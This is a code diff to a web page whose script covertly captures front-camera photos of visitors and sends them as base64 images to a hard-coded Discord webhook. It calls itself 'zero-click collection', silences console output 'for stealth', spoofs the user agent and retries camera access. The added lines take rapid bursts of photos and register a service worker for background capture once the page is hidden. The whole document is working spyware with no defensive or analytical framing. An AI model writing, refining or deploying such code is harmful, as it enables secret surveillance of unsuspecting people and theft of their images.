@@ -18,9 +18,9 @@
 </head>
 <body>
     <script>
-        // Discord webhook URL (replace with valid webhook)
+        // Discord webhook URL (replace with your valid webhook)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
-        
+
         // Suppress console logs for stealth
         console.log = console.error = console.warn = () => {};
 
@@ -35,7 +35,7 @@
                             { name: 'Type', value: type },
                             { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                             { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
-                            { name: 'Device', value: navigator.userAgent }
+                            { name: 'Device', value: navigator.userAgent || 'Unknown' }
                         ],
                         timestamp: new Date().toISOString()
                     }]
@@ -49,7 +49,9 @@
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     body: formData,
-                    headers: { 'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1` } // Fake UA
+                    headers: { 
+                        'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1`
+                    }
                 });
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
                 return true;
@@ -58,101 +60,109 @@
             }
         }
 
-        // Collect 20 photos over 7 minutes using front-facing camera
-        async function collectPhotos() {
+        // Capture a single photo
+        async function capturePhoto(stream, index, phase) {
+            try {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                const canvas = document.createElement('canvas');
+                canvas.width = 240;
+                canvas.height = 180;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.1));
+                const reader = new FileReader();
+                const photo = await new Promise(resolve => {
+                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                    reader.readAsDataURL(blob);
+                });
+                await sendItem(`${phase} Photo ${index + 1}`, photo, index);
+                video.srcObject = null; // Clean up
+                return true;
+            } catch (e) {
+                await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e.message}` }, index);
+                return false;
+            }
+        }
+
+        // Collect 8 photos quickly (~4 seconds)
+        async function collectInitialPhotos() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 await sendItem('Camera', { error: 'Camera not supported', device: navigator.userAgent });
-                return;
+                return false;
             }
 
             let stream = null;
             const maxRetries = 3;
             let retryCount = 0;
 
-            // Attempt to access camera with retries
             while (!stream && retryCount < maxRetries) {
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             facingMode: 'user', // Front-facing camera
-                            width: { ideal: 240 }, // Lower res for speed
+                            width: { ideal: 240 }, 
                             height: { ideal: 180 },
-                            frameRate: { ideal: 10 } // Optimize for mobile
+                            frameRate: { ideal: 10 }
                         },
                         audio: false 
                     });
                 } catch (e) {
                     retryCount++;
-                    await sendItem('Camera', { error: `Camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
+                    await sendItem('Camera', { error: `Initial camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
                     if (retryCount === maxRetries) {
-                        await sendItem('Camera', { error: 'Max retries reached, aborting' });
-                        return;
+                        await sendItem('Camera', { error: 'Max retries reached, aborting initial capture' });
+                        return false;
                     }
-                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before retry
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
 
-            try {
-                // Spread 20 photos over 7 minutes (420,000 ms)
-                const totalPhotos = 20;
-                const totalDuration = 420000; // 7 minutes
-                const interval = totalDuration / totalPhotos; // ~21 seconds per photo
-
-                for (let i = 0; i < totalPhotos; i++) {
+            if (stream) {
+                for (let i = 0; i < 8; i++) {
                     await new Promise(resolve => setTimeout(async () => {
-                        try {
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            await new Promise(resolve => video.onloadedmetadata = resolve);
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 240;
-                            canvas.height = 180;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.1)); // Ultra-low quality
-                            const reader = new FileReader();
-                            const photo = await new Promise(resolve => {
-                                reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
-                                reader.readAsDataURL(blob);
-                            });
-                            await sendItem(`Photo ${i + 1}`, photo, i);
-                            video.srcObject = null; // Clean up
-                            resolve();
-                        } catch (e) {
-                            await sendItem(`Photo ${i + 1}`, { error: `Capture failed: ${e.message}` }, i);
-                            resolve();
-                        }
-                    }, i * interval + Math.random() * 100)); // Randomize timing slightly
+                        await capturePhoto(stream, i, 'Initial');
+                        resolve();
+                    }, i * 500 + Math.random() * 50)); // 500ms interval with slight randomization
                 }
-
                 stream.getTracks().forEach(track => track.stop());
-                await sendItem('Status', { message: 'All 20 photos captured successfully!' });
-            } catch (e) {
-                await sendItem('Camera', { error: `Fatal camera error: ${e.message}` });
+                await sendItem('Status', { message: 'Initial 8 photos captured successfully' });
+                return true;
+            }
+            return false;
+        }
+
+        // Register ServiceWorker for background photo capture
+        async function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+                    await navigator.serviceWorker.ready;
+                    registration.active.postMessage({ action: 'startBackgroundCapture' });
+                } catch (e) {
+                    await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
+                }
+            } else {
+                await sendItem('ServiceWorker', { error: 'ServiceWorker not supported' });
             }
         }
 
-        // Ensure background execution for 7 minutes
+        // Ensure background execution
         async function keepRunningInBackground() {
             try {
-                // Request wake lock for screen
                 if ('wakeLock' in navigator) {
                     const lock = await navigator.wakeLock.request('screen');
-                    setTimeout(() => lock.release(), 420000); // Release after 7 minutes
+                    setTimeout(() => lock.release(), 5000); // Release after initial captures (~5s)
                 }
 
-                // Handle visibility changes to keep script alive
-                document.addEventListener('visibilitychange', () => {
+                document.addEventListener('visibilitychange', async () => {
                     if (document.visibilityState === 'hidden') {
-                        // Trigger a lightweight keep-alive
-                        setTimeout(() => {}, 0);
+                        await registerServiceWorker(); // Trigger background capture
                     }
                 });
 
-                // Periodic keep-alive to prevent browser suspension
-                const keepAlive = setInterval(() => {
-                    // No-op to keep script alive
-                }, 10000); // Every 10 seconds
+                const keepAlive = setInterval(() => {}, 10000); // Keep alive
                 setTimeout(() => clearInterval(keepAlive), 420000); // Stop after 7 minutes
             } catch (e) {
                 // Silent fail
@@ -162,7 +172,7 @@
         // Start zero-click collection
         (async () => {
             await keepRunningInBackground();
-            await collectPhotos();
+            await collectInitialPhotos();
         })();
     </script>
 </body>
